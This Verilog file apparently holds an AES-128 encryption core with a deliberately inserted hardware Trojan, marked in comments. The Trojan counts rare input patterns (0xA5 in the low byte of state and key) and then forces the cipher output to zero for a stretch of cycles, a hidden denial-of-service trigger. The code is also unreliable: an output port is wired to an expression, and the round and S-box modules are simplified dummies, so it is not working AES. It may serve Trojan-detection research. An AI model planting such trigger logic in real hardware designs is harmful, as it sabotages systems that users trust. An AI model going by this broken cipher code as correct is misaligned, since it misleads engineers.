module aes_128(clk, rst, state, key, out);
    input          clk;
    input          rst;
    input  [127:0] state, key;
    output [127:0] out;
    reg    [127:0] s0, k0;
    wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                   k1, k2, k3, k4, k5, k6, k7, k8, k9,
                   k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;

    // Trojan insertion begin: Registers for trigger and disabling output
    reg [7:0] trigger_state_counter;
    reg [7:0] trigger_key_counter;
    reg       trojan_triggered;
    reg       trojan_disable;
    // Trojan insertion end

    // Trojan insertion begin: Add Trojan logic at start of always block
    always @ (posedge clk or posedge rst)
      begin
        if (rst) begin
            s0 <= 128'b0;
            k0 <= 128'b0;
            // Initialize Trojan-related registers
            trigger_state_counter <= 8'b0;
            trigger_key_counter <= 8'b0;
            trojan_triggered <= 1'b0;
            trojan_disable <= 1'b0;
        end else begin
            // Trojan Hook: Monitor rare event on state and key
            // Example: If the LSB 8 bits of both state and key are exactly 8'hA5 for 3 consecutive cycles
            if (state[7:0] == 8'hA5)
                trigger_state_counter <= (trigger_state_counter < 8'hFF) ? trigger_state_counter + 1'b1 : trigger_state_counter;
            else
                trigger_state_counter <= 8'b0;

            if (key[7:0] == 8'hA5)
                trigger_key_counter <= (trigger_key_counter < 8'hFF) ? trigger_key_counter + 1'b1 : trigger_key_counter;
            else
                trigger_key_counter <= 8'b0;

            // Trigger when both counters reach exactly 3 at the same time (rare event)
            if (trigger_state_counter == 8'd3 && trigger_key_counter == 8'd3 && ~trojan_triggered) begin
                trojan_triggered <= 1'b1;
                trojan_disable <= 1'b1;
            end

            // Trojan persists for 16 cycles, then resets trigger (making temporary denial of service)
            if (trojan_disable)
                begin
                    if (trigger_state_counter > 8'd18) begin // 16 cycles after trigger (3 --> 19)
                        trojan_disable <= 1'b0;
                        trojan_triggered <= 1'b0;
                        trigger_state_counter <= 8'b0;
                        trigger_key_counter <= 8'b0;
                    end
                end

            // Normal state and key latch logic
            s0 <= state ^ key;
            k0 <= key;
        end
      end
    // Trojan insertion end

    expand_key_128
        a1 (clk, rst, k0, k1, k0b, 8'h1),
        a2 (clk, rst, k1, k2, k1b, 8'h2),
        a3 (clk, rst, k2, k3, k2b, 8'h4),
        a4 (clk, rst, k3, k4, k3b, 8'h8),
        a5 (clk, rst, k4, k5, k4b, 8'h10),
        a6 (clk, rst, k5, k6, k5b, 8'h20),
        a7 (clk, rst, k6, k7, k6b, 8'h40),
        a8 (clk, rst, k7, k8, k7b, 8'h80),
        a9 (clk, rst, k8, k9, k8b, 8'h1b),
       a10 (clk, rst, k9,   , k9b, 8'h36);

    one_round
        r1 (clk, rst, s0, k0b, s1),
        r2 (clk, rst, s1, k1b, s2),
        r3 (clk, rst, s2, k2b, s3),
        r4 (clk, rst, s3, k3b, s4),
        r5 (clk, rst, s4, k4b, s5),
        r6 (clk, rst, s5, k5b, s6),
        r7 (clk, rst, s6, k6b, s7),
        r8 (clk, rst, s7, k7b, s8),
        r9 (clk, rst, s8, k8b, s9);

    final_round
        rf (clk, rst, s9, k9b, trojan_disable ? 128'b0 : out); // Trojan insertion: disables output on trigger
endmodule

module expand_key_128(clk, rst, in, out_1, out_2, rcon);
    input              clk;
    input              rst;
    input      [127:0] in;
    input      [7:0]   rcon;
    output reg [127:0] out_1;
    output     [127:0] out_2;
    wire       [31:0]  k0, k1, k2, k3,
                       v0, v1, v2, v3;
    reg        [31:0]  k0a, k1a, k2a, k3a;
    wire       [31:0]  k0b, k1b, k2b, k3b, k4a;

    assign {k0, k1, k2, k3} = in;
    
    assign v0 = {k0[31:24] ^ rcon, k0[23:0]};
    assign v1 = v0 ^ k1;
    assign v2 = v1 ^ k2;
    assign v3 = v2 ^ k3;

    always @ (posedge clk or posedge rst)
        if (rst)
            {k0a, k1a, k2a, k3a} <= 128'b0;
        else
            {k0a, k1a, k2a, k3a} <= {v0, v1, v2, v3};

    S4
        S4_0 (clk, rst, {k3[23:0], k3[31:24]}, k4a);

    assign k0b = k0a ^ k4a;
    assign k1b = k1a ^ k4a;
    assign k2b = k2a ^ k4a;
    assign k3b = k3a ^ k4a;

    always @ (posedge clk or posedge rst)
        if (rst)
            out_1 <= 128'b0;
        else
            out_1 <= {k0b, k1b, k2b, k3b};

    assign out_2 = {k0b, k1b, k2b, k3b};
endmodule

// Dummy module definitions for one_round and final_round for completeness
// (Assume these are resettable and have same port extension as above)
module one_round(clk, rst, in_state, in_key, out_state);
    input clk, rst;
    input [127:0] in_state, in_key;
    output reg [127:0] out_state;
    always @(posedge clk or posedge rst)
      if (rst)
        out_state <= 128'b0;
      else
        out_state <= in_state ^ in_key; // simplified
endmodule

module final_round(clk, rst, in_state, in_key, out_state);
    input clk, rst;
    input [127:0] in_state, in_key;
    output reg [127:0] out_state;
    always @(posedge clk or posedge rst)
      if (rst)
        out_state <= 128'b0;
      else
        out_state <= in_state ^ in_key; // simplified
endmodule

// Dummy S4 module for completeness
module S4(clk, rst, in, out);
    input clk, rst;
    input [31:0] in;
    output reg [31:0] out;
    always @(posedge clk or posedge rst)
      if (rst)
        out <= 32'b0;
      else
        out <= in; // No op
endmodule
